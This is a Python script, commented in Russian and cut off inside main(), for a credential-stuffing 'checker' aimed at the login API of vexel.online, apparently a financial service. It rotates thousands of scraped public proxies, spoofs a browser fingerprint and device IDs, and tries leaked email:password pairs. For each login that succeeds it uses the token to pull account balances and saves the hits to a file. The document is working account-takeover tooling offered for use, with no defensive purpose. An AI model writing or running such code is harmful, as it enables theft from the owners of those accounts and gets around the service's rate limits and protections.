import json, random, string, time, hashlib, uuid, re, os, sys, threading
from concurrent.futures import ThreadPoolExecutor
from curl_cffi import requests

# --- ЦВЕТА ---
class Color:
    GREEN = '\033[92m'; RED = '\033[91m'; YELLOW = '\033[93m'
    CYAN = '\033[96m'; WHITE = '\033[97m'; RESET = '\033[0m'

# --- ГЛОБАЛЬНЫЕ ОБЪЕКТЫ ---
print_lock = threading.Lock()
save_lock = threading.Lock()
proxy_lock = threading.Lock()

stats = {'good': 0, 'bad': 0, 'left': 0, 'proxies_count': 0}
all_proxies = [] 

def log(msg, color=Color.WHITE):
    with print_lock:
        sys.stdout.write(f"{color}{msg}{Color.RESET}\n")
        sys.stdout.flush()

# --- СИСТЕМА ОБНОВЛЕНИЯ ПРОКСИ (РАСШИРЕННАЯ) ---

def proxy_refresher():
    """Фоновое обновление прокси из GitHub и API источников каждые 120 секунд"""
    global all_proxies
    
    sources = [
        # SOCKS5
        ("socks5", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all"),
        ("socks5", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt"),
        ("socks5", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"),
        ("socks5", "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"),
        # SOCKS4
        ("socks4", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all"),
        ("socks4", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"),
        ("socks4", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt"),
        # HTTP
        ("http", "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"),
        ("http", "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"),
        ("http", "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt")
    ]
    
    import requests as r_simple
    
    while True:
        new_proxies_set = set() # Сет для удаления дубликатов
        
        for proto, url in sources:
            try:
                resp = r_simple.get(url, timeout=15)
                if resp.status_code == 200:
                    raw = resp.text.strip().splitlines()
                    for p in raw:
                        p = p.strip()
                        if ":" in p and not p.startswith("#"):
                            new_proxies_set.add(f"{proto}://{p}")
            except: continue
        
        if new_proxies_set:
            with proxy_lock:
                all_proxies = list(new_proxies_set)
                stats['proxies_count'] = len(all_proxies)
            log(f"\n[SYSTEM] База обновлена: {len(all_proxies)} уникальных прокси.", Color.CYAN)
        
        time.sleep(120) # Обновление каждые 2 минуты

# --- СИСТЕМА АВТОСОХРАНЕНИЯ (RESUME) ---

def get_history_path(base_file_path):
    filename = os.path.basename(base_file_path)
    return f".vexel_history_{filename}.txt"

def load_history(history_path):
    if os.path.exists(history_path):
        with open(history_path, 'r', encoding='utf-8') as f:
            return set(line.strip() for line in f)
    return set()

def add_to_history(history_path, account_line):
    with save_lock:
        with open(history_path, 'a', encoding='utf-8') as f:
            f.write(account_line + "\n")

# --- КЛАСС ЧЕКЕРА ---

class VexelChecker:
    def __init__(self, email, password, p_threads, history_path, full_line):
        self.email = email
        self.password = password
        self.p_threads = p_threads
        self.history_path = history_path
        self.full_line = full_line
        self.found = False
        self.lock = threading.Lock()
        self.device_id = f"{hashlib.md5(os.urandom(16)).hexdigest()}-{hashlib.md5(os.urandom(16)).hexdigest()}"
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

    def check_proxy(self, proxy_str):
        if self.found: return
        session = requests.Session(impersonate="chrome120")
        session.proxies = {"http": proxy_str, "https": proxy_str}
        headers = {
            "Host": "vexel.online", "X-Device-Id": self.device_id, "X-Device-Platform": "Web",
            "X-Device-Model": self.ua, "User-Agent": self.ua, "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json", "Origin": "https://app.vexel.com", "Referer": "https://app.vexel.com/",
        }
        try:
            payload = {"email": self.email, "password": self.password, "lang": "ru"}
            resp = session.post("https://vexel.online/api/v2/auth/newlogin", 
                                data=json.dumps(payload, separators=(',', ':')), 
                                headers=headers, timeout=15)
            if resp.status_code == 200:
                if '"access_token":"' in resp.text:
                    with self.lock:
                        if self.found: return
                        self.found = True
                    token = resp.json()['data']['access_token']
                    headers["Authorization"] = f"Bearer {token}"
                    acc_res = session.post("https://vexel.online/api/v2/accounts", 
                                           data=json.dumps({"operation": "accountGetList"}, separators=(',', ':')), 
                                           headers=headers, timeout=10)
                    balances = " | ".join(re.findall(r'"name"(.*?),"overdraft"', acc_res.text))
                    balances = balances.replace('":"', ':').replace('"', '').strip(': ')
                    res_str = f"{self.email}:{self.password} | {balances}"
                    log(f"[GOOD] {res_str}", Color.GREEN)
                    with save_lock:
                        with open("success.txt", "a", encoding="utf-8") as f: f.write(res_str + "\n")
                    add_to_history(self.history_path, self.full_line)
                    stats['good'] += 1
                elif '"status":0' in resp.text:
                    with self.lock:
                        if self.found: return
                        self.found = True
                    log(f"[BAD] {self.email}:{self.password}", Color.RED)
                    with open("bad.txt", "a", encoding="utf-8") as f: f.write(f"{self.email}:{self.password}\n")
                    add_to_history(self.history_path, self.full_line)
                    stats['bad'] += 1
        except: pass

    def run(self):
        # Берем текущий срез прокси
        with proxy_lock:
            current_proxies = random.sample(all_proxies, min(len(all_proxies), 1500))
        
        chunk_size = 500
        for i in range(0, len(current_proxies), chunk_size):
            if self.found: break
            batch = current_proxies[i:i+chunk_size]
            with ThreadPoolExecutor(max_workers=self.p_threads) as executor:
                executor.map(self.check_proxy, batch)
        
        if not self.found:
            log(f"[FAIL] {self.email} - Не пробито", Color.YELLOW)
            add_to_history(self.history_path, self.full_line)
        
        with print_lock: stats['left'] -= 1

# --- MAIN ---

def main():
    global all_proxies
    os.system('cls' if os.name == 'nt' else 'clear')
    log("=== VEXEL ENTERPRISE TURBO CHECKER ===", Color.CYAN)
    
